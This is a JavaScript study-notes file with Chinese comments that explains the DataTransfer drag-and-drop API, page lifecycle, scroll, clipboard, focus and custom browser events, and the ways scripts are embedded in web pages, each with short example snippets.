// DragEvent()构造函数接受两个参数，第一个参数是字符串，表示事件的类型，该参数必须；
// 第二个参数是事件的配置对象，用来设置事件的属性，该参数可选。
// 配置对象除了接受MouseEvent接口和Event接口的配置属性，还可以设置dataTransfer
// 属性要么是null，要么是一个DataTransfer接口的实例。
// DataTransfer的实例对象用来读写拖拉事件中传输的数据
// DataTransfer 接口概述
// 所有拖拉事件的实例都有一个DragEvent.dataTransfer属性，用来读写需要传递的数据。
// 这个属性的值是一个DataTransfer接口的实例。
// 浏览器原生提供一个DataTransfer()构造函数，用来生成DataTransfer实例对象。
var dataTrans = new DataTransfer();
// DataTransfer()构造函数不接受参数。
// 拖拉的数据分成两方面：数据的种类（又称格式）和数据的值。数据的种类是
// 一个 MIME 字符串（比如text/plain、image/jpeg），数据的值是一个字符串。
// 一般来说，如果拖拉一段文本，则数据默认就是那段文本；如果拖拉一个链接，
// 则数据默认就是链接的 URL。
// 拖拉事件开始时，开发者可以提供数据类型和数据值。拖拉过程中，开发者
// 通过dragenter和dragover事件的监听函数，检查数据类型，以确定是否允许
// 放下（drop）被拖拉的对象。比如，在只允许放下链接的区域，检查拖拉的数据类型
// 是否为text/uri-list。
// 发生drop事件时，监听函数取出拖拉的数据，对其进行处理。
// DataTransfer 的实例属性
// DataTransfer.dropEffect
// DataTransfer.dropEffect属性用来设置放下（drop）被拖拉节点时的效果，
// 会影响到拖拉经过相关区域时鼠标的形状。它可能取下面的值。
// copy：复制被拖拉的节点
// move：移动被拖拉的节点
// link：创建指向被拖拉的节点的链接
// none：无法放下被拖拉的节点
// 除了上面这些值，设置其他的值都是无效的。
target.addEventListener('dragover', function (e) {
    e.preventDefault();
    e.stopPropagation();
    e.dataTransfer.dropEffect = 'copy';
});
// 上面代码中，被拖拉元素一旦drop，接受的区域会复制该节点。
// dropEffect属性一般在dragenter和dragover事件的监听函数中设置，
// 对于dragstart、drag、dragleave这三个事件，该属性不起作用。
// 因为该属性只对接受被拖拉的节点的区域有效，对被拖拉的节点本身是无效的。
// 进入目标区域后，拖拉行为会初始化成设定的效果。
// DataTransfer.effectAllowed
// DataTransfer.effectAllowed属性设置本次拖拉中允许的效果。它可能取下面的值。
// copy：复制被拖拉的节点
// move：移动被拖拉的节点
// link：创建指向被拖拉节点的链接
// copyLink：允许copy或link
// copyMove：允许copy或move
// linkMove：允许link或move
// all：允许所有效果
// none：无法放下被拖拉的节点
// uninitialized：默认值，等同于all
// 如果某种效果是不允许的，用户就无法在目标节点中达成这种效果。
// 这个属性与dropEffect属性是同一件事的两个方面。前者设置被拖拉的节点允许的效果，
// 后者设置接受拖拉的区域的效果，它们往往配合使用。
// dragstart事件的监听函数，可以用来设置这个属性。其他事件的监听函数里面
// 设置这个属性是无效的。
// 只要dropEffect属性和effectAllowed属性之中，有一个为none，就无法
// 在目标节点上完成drop操作。
source.addEventListener('dragstart', function (e) {
    e.dataTransfer.effectAllowed = 'move';
});
target.addEventListener('dragover', function (e) {
    ev.dataTransfer.dropEffect = 'move';
});
// DataTransfer.files
// DataTransfer.files属性是一个 FileList 对象，包含一组本地文件，
// 可以用来在拖拉操作中传送。如果本次拖拉不涉及文件，则该属性为空的 FileList 对象
// 一个接收拖拉文件的例子
// 通过dataTransfer.files属性读取被拖拉的文件的信息。
// HTML 代码如下
// <div id="output" style="min-height: 200px;border: 1px solid black;">
//   文件拖拉到这里
// </div>
var div = document.getElementById('output');
div.addEventListener("dragenter", function (event) {
    div.textContent = '';
    event.stopPropagation();
    event.preventDefault();
}, false);
div.addEventListener("dragover", function (event) {
    event.stopPropagation();
    event.preventDefault();
}, false);
div.addEventListener("drop", function (event) {
    event.stopPropagation();
    event.preventDefault();
    var files = event.dataTransfer.files;
    for (var i = 0; i < files.length; i++) {
        div.textContent += files[i].name + ' ' + files[i].size + '字节\n';
    }
}, false);
// 如果想要读取文件内容，就要使用FileReader对象
div.addEventListener('drop', function (e) {
    e.preventDefault();
    e.stopPropagation();

    var fileList = e.dataTransfer.files;
    if (fileList.length > 0) {
        var file = fileList[0];
        var reader = new FileReader();
        reader.onloadend = function (e) {
            if (e.target.readyState === FileReader.DONE) {
                var content = reader.result;
                div.innerHTML = 'File: ' + file.name + '\n\n' + content;
            }
        }
        reader.readAsBinaryString(file);
    }
});
// DataTransfer.types
// DataTransfer.types属性是一个只读的数组，每个成员是一个字符串，
// 里面是拖拉的数据格式（通常是 MIME 值）。比如，如果拖拉的是文字，
// 对应的成员就是text/plain。
// 下面是一个例子，通过检查dataTransfer属性的类型，决定是否允许在当前节点执行drop操作。
// 代码中，只有当被拖拉的节点是一个链接时，才允许在当前节点放下。
function contains(list, value) {
    for (var i = 0; i < list.length; ++i) {
        if (list[i] === value) return true;
    }
    return false;
}

function doDragOver(event) {
    var isLink = contains(event.dataTransfer.types, 'text/uri-list');
    if (isLink) event.preventDefault();
}
// DataTransfer.items
// DataTransfer.items属性返回一个类似数组的只读对象（DataTransferItemList 实例），
// 每个成员就是本次拖拉的一个对象（DataTransferItem 实例）。
// 如果本次拖拉不包含对象，则返回一个空对象。
// DataTransferItemList 实例具有以下的属性和方法。
// length：返回成员的数量
// add(data, type)：增加一个指定内容和类型（比如text/html和text/plain）的字符串
// 作为成员
// add(file)：add方法的另一种用法，增加一个文件作为成员
// remove(index)：移除指定位置的成员
// clear()：移除所有的成员
// DataTransferItem 实例具有以下的属性和方法。
// kind：返回成员的种类（string还是file）。
// type：返回成员的类型（通常是 MIME 值）。
// getAsFile()：如果被拖拉是文件，返回该文件，否则返回null。
// getAsString(callback)：如果被拖拉的是字符串，将该字符传入指定的回调函数处理。
// 该方法是异步的，所以需要传入回调函数。
// 下面是一个例子。
div.addEventListener('drop', function (e) {
    e.preventDefault();
    if (e.dataTransfer.items != null) {
        for (var i = 0; i < e.dataTransfer.items.length; i++) {
            console.log(e.dataTransfer.items[i].kind + ': ' + e.dataTransfer.items[i].type);
        }
    }
});
// DataTransfer 的实例方法
// DataTransfer.setData()
// DataTransfer.setData()方法用来设置拖拉事件所带有的数据。该方法没有返回值。
event.dataTransfer.setData('text/plain', 'Text to drag');
// 上面代码为当前的拖拉事件加入纯文本数据。
// 该方法接受两个参数，都是字符串。第一个参数表示数据类型（比如text/plain），
// 第二个参数是具体数据。如果指定类型的数据在dataTransfer属性不存在，
// 那么这些数据将被加入，否则原有的数据将被新数据替换。
// 如果是拖拉文本框或者拖拉选中的文本，会默认将对应的文本数据，
// 添加到dataTransfer属性，不用手动指定。
{
    /* <div draggable="true">
      aaa
    </div> */
}
// 上面代码中，拖拉这个<div>元素会自动带上文本数据aaa。
// 使用setData方法，可以替换到原有数据。
{
    /* <div
      draggable="true"
      ondragstart="event.dataTransfer.setData('text/plain', 'bbb')"
    >
      aaa
    </div> */
}
// 上面代码中，拖拉数据实际上是bbb，而不是aaa。
// 下面是添加其他类型的数据。由于text/plain是最普遍支持的格式，为了保证兼容性，
// 建议最后总是保存一份纯文本格式的数据。
var dt = event.dataTransfer;
// 添加链接
dt.setData('text/uri-list', 'http://www.example.com');
dt.setData('text/plain', 'http://www.example.com');
// 添加 HTML 代码
dt.setData('text/html', 'Hello there, <strong>stranger</strong>');
dt.setData('text/plain', 'Hello there, <strong>stranger</strong>');
// 添加图像的 URL
dt.setData('text/uri-list', imageurl);
dt.setData('text/plain', imageurl);
// 可以一次提供多种格式的数据。
var dt = event.dataTransfer;
dt.setData('application/x-bookmark', bookmarkString);
dt.setData('text/uri-list', 'http://www.example.com');
dt.setData('text/plain', 'http://www.example.com');
// 上面代码中，通过在同一个事件上面，存放三种类型的数据，使得拖拉事件可以
// 在不同的对象上面，drop不同的值。注意，第一种格式是一个自定义格式，
// 浏览器默认无法读取，这意味着，只有某个部署了特定代码的节点，
// 才可能drop（读取到）这个数据。
// DataTransfer.getData()
// DataTransfer.getData()方法接受一个字符串（表示数据类型）作为参数，
// 返回事件所带的指定类型的数据（通常是用setData方法添加的数据）。
// 如果指定类型的数据不存在，则返回空字符串。通常只有drop事件触发后，才能取出数据。
// 下面是一个drop事件的监听函数，用来取出指定类型的数据。
function onDrop(event) {
    var data = event.dataTransfer.getData('text/plain');
    event.target.textContent = data;
    event.preventDefault();
}
// 上面代码取出拖拉事件的文本数据，将其替换成当前节点的文本内容。
// 注意，这时还必须取消浏览器的默认行为，因为假如用户拖拉的是一个链接，
// 浏览器默认会在当前窗口打开这个链接。
// getData方法返回的是一个字符串，如果其中包含多项数据，就必须手动解析。
function doDrop(event) {
    var lines = event.dataTransfer.getData('text/uri-list').split('\n');
    for (let line of lines) {
        let link = document.createElement('a');
        link.href = line;
        link.textContent = line;
        event.target.appendChild(link);
    }
    event.preventDefault();
}
// 上面代码中，getData方法返回的是一组链接，就必须自行解析。
// 类型值指定为URL，可以取出第一个有效链接。
var link = event.dataTransfer.getData('URL');
// 下面的例子是从多种类型的数据里面取出数据。
function doDrop(event) {
    var types = event.dataTransfer.types;
    var supportedTypes = ['text/uri-list', 'text/plain'];
    types = supportedTypes.filter(function (value) {
        return types.includes(value)
    });
    if (types.length) {
        var data = event.dataTransfer.getData(types[0]);
    }
    event.preventDefault();
}
// DataTransfer.clearData()
// DataTransfer.clearData()方法接受一个字符串（表示数据类型）作为参数，
// 删除事件所带的指定类型的数据。如果没有指定类型，则删除所有数据。
// 如果指定类型不存在，则调用该方法不会产生任何效果。
event.dataTransfer.clearData('text/uri-list');
// 上面代码清除事件所带的text/uri-list类型的数据。
// 该方法不会移除拖拉的文件，因此调用该方法后，DataTransfer.types属性
// 可能依然会返回Files类型（前提是存在文件拖拉）。
// 注意，该方法只能在dragstart事件的监听函数之中使用，因为这是拖拉操
// 作的数据唯一可写的时机。
// DataTransfer.setDragImage()
// 拖动过程中（dragstart事件触发后），浏览器会显示一张图片跟随鼠标一起移动，
// 表示被拖动的节点。这张图片是自动创造的，通常显示为被拖动节点的外观，
// 不需要自己动手设置。
// DataTransfer.setDragImage()方法可以自定义这张图片。它接受三个参数。
// 第一个是<img>节点或者<canvas>节点，如果省略或为null，则使用被拖动的节点
// 的外观；第二个和第三个参数为鼠标相对于该图片左上角的横坐标和右坐标。
// 下面是一个例子。
/* HTML 代码如下
 <div id="drag-with-image" class="dragdemo" draggable="true">
   drag me
 </div>
*/
var div = document.getElementById('drag-with-image');
div.addEventListener('dragstart', function (e) {
    var img = document.createElement('img');
    img.src = 'http://path/to/img';
    e.dataTransfer.setDragImage(img, 0, 0);
}, false);
//======
// 其他常见事件
// 资源事件
// beforeunload 事件
// beforeunload事件在窗口、文档、各种资源将要卸载前触发。
// 它可以用来防止用户不小心卸载资源。
// 如果该事件对象的returnValue属性是一个非空字符串，那么浏览器就会弹出一个对话框，
// 询问用户是否要卸载该资源。但是，用户指定的字符串可能无法显示，浏览器
// 会展示预定义的字符串。如果用户点击“取消”按钮，资源就不会卸载。
window.addEventListener('beforeunload', function (event) {
    event.returnValue = '你确定离开吗？';
});
// 上面代码中，用户如果关闭窗口，浏览器会弹出一个窗口，要求用户确认。
// 浏览器对这个事件的行为很不一致，有的浏览器调用event.preventDefault()，也会
// 弹出对话框。IE 浏览器需要显式返回一个非空的字符串，才会弹出对话框。
// 而且，大多数浏览器在对话框中不显示指定文本，只显示默认文本。因此，可以
// 采用下面的写法，取得最大的兼容性。
window.addEventListener('beforeunload', function (e) {
    var confirmationMessage = '确认关闭窗口？';
    e.returnValue = confirmationMessage;
    return confirmationMessage;
});
// 注意，许多手机浏览器默认忽略这个事件，桌面浏览器也有办法忽略这个事件。
// 所以，它可能根本不会生效，不能依赖它来阻止用户关闭窗口。另外，一旦
// 使用了beforeunload事件，浏览器就不会缓存当前网页，使用“回退”按钮将
// 重新向服务器请求网页。这是因为监听这个事件的目的，一般是修改初始状态，
// 这时缓存初始页面就没意义了。
// 基本上，只有一种场合可以监听unload事件，其他情况都不应该监听：用户
// 修改了表单，还没有保存就要离开。
// unload 事件
// unload事件在窗口关闭或者document对象将要卸载时触发。它的触发顺序
// 排在beforeunload、pagehide事件后面。
// unload事件发生时，文档处于一个特殊状态。所有资源依然存在，但是对用户
// 来说都不可见，UI 互动全部无效。这个事件是无法取消的，即使在监听函数里面
// 抛出错误，也不能停止文档的卸载。
window.addEventListener('unload', function (event) {
    console.log('文档将要卸载');
});
// 手机上，浏览器或系统可能会直接丢弃网页，这时该事件根本不会发生。而且
// 跟beforeunload事件一样，一旦使用了unload事件，浏览器就不会缓存当前网页，
// 理由同上。因此，任何情况下都不应该依赖这个事件，指定网页卸载时要执行的
// 代码，可以考虑完全不使用这个事件。
// load 事件，error 事件
// load事件在页面或某个资源加载成功时触发。注意，页面或资源从浏览器缓存加载，
// 并不会触发load事件。
window.addEventListener('load', function (event) {
    console.log('所有资源都加载完成');
});
// error事件是在页面或资源加载失败时触发。abort事件在用户取消加载时触发。
// 这三个事件实际上属于进度事件，不仅发生在document对象，还发生在各种外部
// 资源上面。浏览网页就是一个加载各种资源的过程，图像（image）、样式表（style sheet）、
// 脚本（script）、视频（video）、音频（audio）、Ajax请求（XMLHttpRequest）等等。
// 这些资源和document对象、window对象、XMLHttpRequestUpload 对象，都会
// 触发load事件和error事件。
// session 历史事件
// pageshow 事件，pagehide 事件
// 默认情况下，浏览器会在当前会话（session）缓存页面，当用户点击“前进/后退”按钮时，
// 浏览器就会从缓存中加载页面。
// pageshow 事件在页面加载时触发，包括第一次加载和从缓存加载两种情况。
// 如果要指定页面每次加载（不管是不是从浏览器缓存）时都运行的代码，可以放在
// 这个事件的监听函数。
// 第一次加载时，它的触发顺序排在load事件后面。从缓存加载时，load事件不会触发，
// 因为网页在缓存中的样子通常是load事件的监听函数运行后的样子，所以不必重复执行。
// 同理，如果是从缓存中加载页面，网页内初始化的 JavaScript 脚本
// （比如 DOMContentLoaded 事件的监听函数）也不会执行。
window.addEventListener('pageshow', function (event) {
    console.log('pageshow: ', event);
});
// pageshow 事件有一个persisted属性，返回一个布尔值。页面第一次加载时，
// 这个属性是false；当页面从缓存加载时，这个属性是true。
window.addEventListener('pageshow', function (event) {
    if (event.persisted) {
        // ...
    }
});
// pagehide事件与pageshow事件类似，当用户通过“前进/后退”按钮，离开当前
// 页面时触发。它与 unload 事件的区别在于，如果在 window 对象上定义unload事件
// 的监听函数之后，页面不会保存在缓存中，而使用pagehide事件，页面会保存在缓存中。
// pagehide事件实例也有一个persisted属性，将这个属性设为true，就表示页面要保存
// 在缓存中；设为false，表示网页不保存在缓存中，这时如果设置了unload 事件的
// 监听函数，该函数将在 pagehide 事件后立即运行。
// 如果页面包含<frame>或<iframe>元素，则<frame>页面的pageshow事件和pagehide事件，
// 都会在主页面之前触发。
// 注意，这两个事件只在浏览器的history对象发生变化时触发，跟网页是否可见没有关系。
// popstate 事件
// popstate事件在浏览器的history对象的当前记录发生显式切换时触发。注意，
// 调用history.pushState()或history.replaceState()，并不会触发popstate事件。
// 该事件只在用户在history记录之间显式切换时触发，比如鼠标点击“后退/前进”按钮，
// 或者在脚本中调用history.back()、history.forward()、history.go()时触发。
// 该事件对象有一个state属性，保存history.pushState方法和history.replaceState方法
// 为当前记录添加的state对象。
window.onpopstate = function (event) {
    console.log('state: ' + event.state);
};
history.pushState({
    page: 1
}, 'title 1', '?page=1');
history.pushState({
    page: 2
}, 'title 2', '?page=2');
history.replaceState({
    page: 3
}, 'title 3', '?page=3');
history.back(); // state: {"page":1}
history.back(); // state: null
history.go(2); // state: {"page":3}
// 上面代码中，pushState方法向history添加了两条记录，然后replaceState方法
// 替换掉当前记录。因此，连续两次back方法，会让当前条目退回到原始网址，
// 它没有附带state对象，所以事件的state属性为null，然后前进两条记录，又
// 回到replaceState方法添加的记录。
// 浏览器对于页面首次加载，是否触发popstate事件，处理不一样，Firefox 不触发该事件。
// hashchange 事件
// hashchange事件在 URL 的 hash 部分（即#号后面的部分，包括#号）发生变化时触发。
// 该事件一般在window对象上监听。
// hashchange的事件实例具有两个特有属性：oldURL属性和newURL属性，分别表示变化前后的
// 完整 URL。
// URL 是 http://www.example.com/
window.addEventListener('hashchange', myFunction);

function myFunction(e) {
    console.log(e.oldURL);
    console.log(e.newURL);
};
location.hash = 'part2';
// http://www.example.com/
// http://www.example.com/#part2
// 网页状态事件
// DOMContentLoaded 事件
// 网页下载并解析完成以后，浏览器就会在document对象上触发 DOMContentLoaded 事件。
// 这时，仅仅完成了网页的解析（整张页面的 DOM 生成了），所有外部资源
// （样式表、脚本、iframe 等等）可能还没有下载结束。也就是说，这个事件比load事件，
// 发生时间早得多。
document.addEventListener('DOMContentLoaded', function (event) {
    console.log('DOM生成');
});
// 注意，网页的 JavaScript 脚本是同步执行的，脚本一旦发生堵塞，将推迟
// 触发DOMContentLoaded事件。
document.addEventListener('DOMContentLoaded', function (event) {
    console.log('DOM 生成');
});
// 这段代码会推迟触发 DOMContentLoaded 事件
for (var i = 0; i < 1000000000; i++) {
    // ...
}
// readystatechange 事件
// readystatechange事件当 Document 对象和 XMLHttpRequest 对象
// 的readyState属性发生变化时触发。document.readyState有三个
// 可能的值：loading（网页正在加载）、interactive（网页已经解析完成，但是外部资源
// 仍然处在加载状态）和complete（网页和所有外部资源已经结束加载，load事件即将触发）。
// 这个事件可以看作DOMContentLoaded事件的另一种实现方法。
document.onreadystatechange = function () {
    if (document.readyState === 'interactive') {
        // ...
    }
}
// 窗口事件
// fullscreenchange 事件，fullscreenerror 事件 
// fullscreenchange事件在进入或推出全屏状态时触发，该事件发生在document对象上面。
// fullscreenerror事件在浏览器无法切换到全屏状态时触发。
document.addEventListener('fullscreenchange', function (event) {
    console.log(document.fullscreenElement);
});
// scroll事件
// 在文档或文档元素滚动时触发，主要出现在用户拖动滚动条。
window.addEventListener('scroll', callback);
// 该事件会连续地大量触发，所以它的监听函数之中不应该有非常耗费计算的操作。
// 推荐的做法是使用requestAnimationFrame或setTimeout控制该事件的触发频率，
// 然后可以结合customEvent抛出一个新事件。
(function () {
    var throttle = function (type, name, obj) {
        var obj = obj || window;
        var running = false;
        var func = function () {
            if (running) {
                return;
            }
            running = true;
            requestAnimationFrame(function () {
                obj.dispatchEvent(new CustomEvent(name));
                running = false;
            });
        };
        obj.addEventListener(type, func);
    };

    // 将 scroll 事件重定义为 optimizedScroll 事件
    throttle('scroll', 'optimizedScroll');
})();
window.addEventListener('optimizedScroll', function () {
    console.log('Resource conscious scroll callback!');
});
// 上面代码中，throttle函数用于控制事件触发频率，requestAnimationFrame方法
// 保证每次页面重绘（每秒60次），只会触发一次scroll事件的监听函数。也就是说，
// 上面方法将scroll事件的触发频率，限制在每秒60次。具体来说，就是scroll事件
// 只要频率低于每秒60次，就会触发optimizedScroll事件，从而执行optimizedScroll事件的
// 监听函数。
// 改用setTimeout方法，可以放置更大的时间间隔。
(function () {
    window.addEventListener('scroll', scrollThrottler, false);
    var scrollTimeout;
    function scrollThrottler() {
        if (!scrollTimeout) {
            scrollTimeout = setTimeout(function () {
                scrollTimeout = null;
                actualScrollHandler();
            }, 66);
        }
    }
    function actualScrollHandler() {
        // ...
    }
}());
// 上面代码中，每次scroll事件都会执行scrollThrottler函数。该函数里面
// 有一个定时器setTimeout，每66毫秒触发一次（每秒15次）真正执行的
// 任务actualScrollHandler。
// 下面是一个更一般的throttle函数的写法。
function throttle(fn, wait) {
    var time = Date.now();
    return function () {
        if ((time + wait - Date.now()) < 0) {
            fn();
            time = Date.now();
        }
    }
}
window.addEventListener('scroll', throttle(callback, 1000));
// 上面的代码将scroll事件的触发频率，限制在一秒一次。
// lodash函数库提供了现成的throttle函数，可以直接使用。
window.addEventListener('scroll', _.throttle(callback, 1000));
// 本书前面介绍过debounce的概念，throttle与它区别在于，throttle是“节流”，
// 确保一段时间内只执行一次，而debounce是“防抖”，要连续操作结束后再执行。
// 以网页滚动为例，debounce要等到用户停止滚动后才执行，throttle则是如果用户
// 一直在滚动网页，那么在滚动过程中还是会执行。
// resize 事件
// resize事件在改变浏览器窗口大小时触发，主要发生在window对象上面。
var resizeMethod = function () {
  if (document.body.clientWidth < 768) {
    console.log('移动设备的视口');
  }
};
window.addEventListener('resize', resizeMethod, true);
// 该事件也会连续地大量触发，所以最好像上面的scroll事件一样，通过throttle函数
// 控制事件触发频率。
// 剪贴板事件
// 以下三个事件属于剪贴板操作的相关事件。
// cut：将选中的内容从文档中移除，加入剪贴板时触发。
// copy：进行复制动作时触发。
// paste：剪贴板内容粘贴到文档后触发。
// 这三个事件都是ClipboardEvent接口的实例。ClipboardEvent有一个实例属性clipboardData，
// 是一个 DataTransfer 对象，存放剪贴的数据。具体的 API 接口和操作方法，
// 请参见《拖拉事件》的 DataTransfer 对象部分。
document.addEventListener('copy', function (e) {
  e.clipboardData.setData('text/plain', 'Hello, world!');
  e.clipboardData.setData('text/html', '<b>Hello, world!</b>');
  e.preventDefault();
});
// 上面的代码使得复制进入剪贴板的，都是开发者指定的数据，而不是用户想要拷贝的数据。
// 焦点事件
// 焦点事件发生在元素节点和document对象上面，与获得或失去焦点相关。它主要包括以下四个事件。
// focus：元素节点获得焦点后触发，该事件不会冒泡。
// blur：元素节点失去焦点后触发，该事件不会冒泡。
// focusin：元素节点将要获得焦点时触发，发生在focus事件之前。该事件会冒泡。
// focusout：元素节点将要失去焦点时触发，发生在blur事件之前。该事件会冒泡。
// 这四个事件都继承了FocusEvent接口。FocusEvent实例具有以下属性。
// FocusEvent.target：事件的目标节点。
// FocusEvent.relatedTarget：对于focusin事件，返回失去焦点的节点；
// 对于focusout事件，返回将要接受焦点的节点；对于focus和blur事件，返回null。
// 由于focus和blur事件不会冒泡，只能在捕获阶段触发，所以addEventListener方法
// 的第三个参数需要设为true。
form.addEventListener('focus', function (event) {
  event.target.style.background = 'pink';
}, true);

form.addEventListener('blur', function (event) {
  event.target.style.background = '';
}, true);
// 上面代码针对表单的文本输入框，接受焦点时设置背景色，失去焦点时去除背景色
// CustomEvent 接口
// CustomEvent 接口用于生成自定义的事件实例。那些浏览器预定义的事件，
// 虽然可以手动生成，但是往往不能在事件上绑定数据。如果需要在触发事件的同时，
// 传入指定的数据，就可以使用 CustomEvent 接口生成的自定义事件对象。
// 浏览器原生提供CustomEvent()构造函数，用来生成 CustomEvent 事件实例。
new CustomEvent(type, options)
// CustomEvent()构造函数接受两个参数。第一个参数是字符串，表示事件的名字，
// 这是必须的。第二个参数是事件的配置对象，这个参数是可选的。CustomEvent的配置
// 对象除了接受 Event 事件的配置属性，只有一个自己的属性。
// detail：表示事件的附带数据，默认为null。
// 下面是一个例子。
var event = new CustomEvent('build', { 'detail': 'hello' });
function eventHandler(e) {
  console.log(e.detail);
}
document.body.addEventListener('build', function (e) {
  console.log(e.detail);
});
document.body.dispatchEvent(event);
// 上面代码中，我们手动定义了build事件。该事件触发后，会被监听到，从而输出
// 该事件实例的detail属性（即字符串hello）。
// 下面是另一个例子。
var myEvent = new CustomEvent('myevent', {
  detail: {
    foo: 'bar'
  },
  bubbles: true,
  cancelable: false
});
el.addEventListener('myevent', function (event) {
  console.log('Hello ' + event.detail.foo);
});
el.dispatchEvent(myEvent);
// 上面代码也说明，CustomEvent 的事件实例，除了具有 Event 接口的实例属性，
// 还具有detail属性。
//=====
// GlobalEventHandlers 接口
// 指定事件的回调函数，推荐使用的方法是元素的addEventListener方法。
div.addEventListener('click', clickHandler, false);
// 除了之外，还有一种方法可以直接指定事件的回调函数。
div.onclick = clickHandler;
// 这个接口是由GlobalEventHandlers接口提供的。它的优点是使用比较方便，缺点是
// 只能为每个事件指定一个回调函数，并且无法指定事件触发的阶段（捕获阶段还是冒泡阶段）。
// HTMLElement、Document和Window都继承了这个接口，也就是说，
// 各种 HTML 元素、document对象、window对象上面都可以使用GlobalEventHandlers接口
// 提供的属性。
// GlobalEventHandlers.onabort
// 某个对象的abort事件（停止加载）发生时，就会调用onabort属性指定的回调函数。
// 各种元素的停止加载事件，到底如何触发，目前并没有统一的规定。因此实际上，
// 这个属性现在一般只用在<img>元素上面。
// HTML 代码如下
// <img src="example.jpg" id="img">
var img = document.getElementById('img');
img.onabort = function () {
  console.log('image load aborted.');
}
// GlobalEventHandlers.onerror
// error事件发生时，就会调用onerror属性指定的回调函数。
// error事件分成两种。
// 一种是 JavaScript 的运行时错误，这会传到window对象，导致window.onerror()。
window.onerror = function (message, source, lineno, colno, error) {
  // ...
}
// window.onerror的处理函数共接受五个参数，含义如下。
// message：错误信息字符串
// source：报错脚本的 URL
// lineno：报错的行号，是一个整数
// colno：报错的列号，是一个整数
// error： 错误对象
// 另一种是资源加载错误，比如<img>或<script>加载的资源出现加载错误。
// 这时，Error 对象会传到对应的元素，导致该元素的onerror属性开始执行。
// 注意，一般来说，资源的加载错误不会触发window.onerror
element.onerror = function (event) {
  // ...
}
// GlobalEventHandlers.onload、GlobalEventHandlers.onloadstart
// 元素完成加载时，会触发load事件，执行onload()。它的典型使用场景是window对象
// 和<img>元素。对于window对象来说，只有页面的所有资源加载完成（包括图片、脚本、
// 样式表、字体等所有外部资源），才会触发load事件。
// 对于<img>和<video>等元素，加载开始时还会触发loadstart事件，导致执行onloadstart。
// GlobalEventHandlers.onfocus，GlobalEventHandlers.onblur
// 当前元素获得焦点时，会触发element.onfocus；失去焦点时，会触发element.onblur。
element.onfocus = function () {
  console.log("onfocus event detected!");
};
element.onblur = function () {
  console.log("onblur event detected!");
};
// 注意，如果不是可以接受用户输入的元素，要触发onfocus，该元素必须有tabindex属性。
// GlobalEventHandlers.onscroll
// 页面或元素滚动时，会触发scroll事件，导致执行onscroll()。
// GlobalEventHandlers.oncontextmenu，GlobalEventHandlers.onshow
// 用户在页面上按下鼠标的右键，会触发contextmenu事件，导致执行oncontextmenu()。
// 如果该属性执行后返回false，就等于禁止了右键菜单。document.oncontextmenu
// 与window.oncontextmenu效果一样。
document.oncontextmenu = function () {
  return false;
};
// 上面代码中，oncontextmenu属性执行后返回false，右键菜单就不会出现。
// 元素的右键菜单显示时，会触发该元素的onshow监听函数。
// 其他的事件属性
// 鼠标的事件属性。
// onclick
// ondblclick
// onmousedown
// onmouseenter
// onmouseleave
// onmousemove
// onmouseout
// onmouseover
// onmouseup
// onwheel
// 键盘的事件属性。
// onkeydown
// onkeypress
// onkeyup
// 焦点的事件属性。
// onblur
// onfocus
// 表单的事件属性。
// oninput
// onchange
// onsubmit
// onreset
// oninvalid
// onselect
// 触摸的事件属性。
// ontouchcancel
// ontouchend
// ontouchmove
// ontouchstart
// 拖动的事件属性分成两类：一类与被拖动元素相关，另一类与接收被拖动元素的容器元素相关。
// 被拖动元素的事件属性。
// ondragstart：拖动开始
// ondrag：拖动过程中，每隔几百毫秒触发一次
// ondragend：拖动结束
// 接收被拖动元素的容器元素的事件属性。
// ondragenter：被拖动元素进入容器元素。
// ondragleave：被拖动元素离开容器元素。
// ondragover：被拖动元素在容器元素上方，每隔几百毫秒触发一次。
// ondrop：松开鼠标后，被拖动元素放入容器元素。
// <dialog>对话框元素的事件属性。
// oncancel
// onclose
//===================================浏览器模型=================================
// 浏览器环境概述
// JavaScript 是浏览器的内置脚本语言。也就是说，浏览器内置了 JavaScript 引擎，
// 并且提供各种接口，让 JavaScript 脚本可以控制浏览器的各种功能。一旦网页
// 内嵌了 JavaScript 脚本，浏览器加载网页，就会去执行脚本，从而达到操作
// 浏览器的目的，实现网页的各种动态效果。
// 代码嵌入网页的方法
// 网页中嵌入 JavaScript 代码，主要有三种方法。
// <script>元素直接嵌入代码。
// <script>标签加载外部脚本
// 事件属性
// URL 协议
// script 元素嵌入代码
// <script>元素内部可以直接写 JavaScript 代码。
{/* <script>
  var x = 1 + 5;
  console.log(x);
</script> */}
//<script>标签有一个type属性，用来指定脚本类型。对 JavaScript 脚本来说，
// type属性可以设为两种值。
// text/javascript：这是默认值，也是历史上一贯设定的值。如果你省略type属性，
// 默认就是这个值。对于老式浏览器，设为这个值比较好。
// application/javascript：对于较新的浏览器，建议设为这个值。
{/* <script type="application/javascript">
  console.log('Hello World');
</script> */}
// 由于<script>标签默认就是 JavaScript 代码。所以，嵌入 JavaScript 脚本时，
// type属性可以省略。
// 如果type属性的值，浏览器不认识，那么它不会执行其中的代码。利用这一点，
// 可以在<script>标签之中嵌入任意的文本内容，只要加上一个浏览器不认识的type属性即可。
{/* <script id="mydata" type="x-custom-data">
  console.log('Hello World');
</script> */}
// 上面的代码，浏览器不会执行，也不会显示它的内容，因为不认识它的type属性。
// 但是，这个<script>节点依然存在于 DOM 之中，可以使用<script>节点的text属性
// 读出它的内容。
document.getElementById('mydata').text ;//  console.log('Hello World');
// script 元素加载外部脚本
//<script>标签也可以指定加载外部的脚本文件。
{/* <script src="https://www.example.com/script.js"></script> */}
//如果脚本文件使用了非英语字符，还应该注明字符的编码。
{/* <script charset="utf-8" src="https://www.example.com/script.js"></script> */}
// 所加载的脚本必须是纯的 JavaScript 代码，不能有HTML代码和<script>标签。
// 加载外部脚本和直接添加代码块，这两种方法不能混用。下面代码的console.log语句
// 直接被忽略。
{/* <script charset="utf-8" src="example.js">
  console.log('Hello World!');
</script> */}
// 为了防止攻击者篡改外部脚本，script标签允许设置一个integrity属性，
// 写入该外部脚本的 Hash 签名，用来验证脚本的一致性。
{/* <script src="/assets/application.js"
  integrity="sha256-TvVUHzSfftWg1rcfL6TIJ0XKEGrgLyEq6lEpcmrG9qs=">
</script> */}
// 上面代码中，script标签有一个integrity属性，指定了
// 外部脚本/assets/application.js的 SHA256 签名。一旦有人改了这个脚本，
// 导致 SHA256 签名不匹配，浏览器就会拒绝加载
// 事件属性
// 网页元素的事件属性（比如onclick和onmouseover），可以写入 JavaScript 代码。
// 当指定事件发生时，就会调用这些代码。
{/* <button id="myBtn" onclick="console.log(this.id)">点击</button> */}
// 上面的事件属性代码只有一个语句。如果有多个语句，使用分号分隔即可。
// URL 协议 
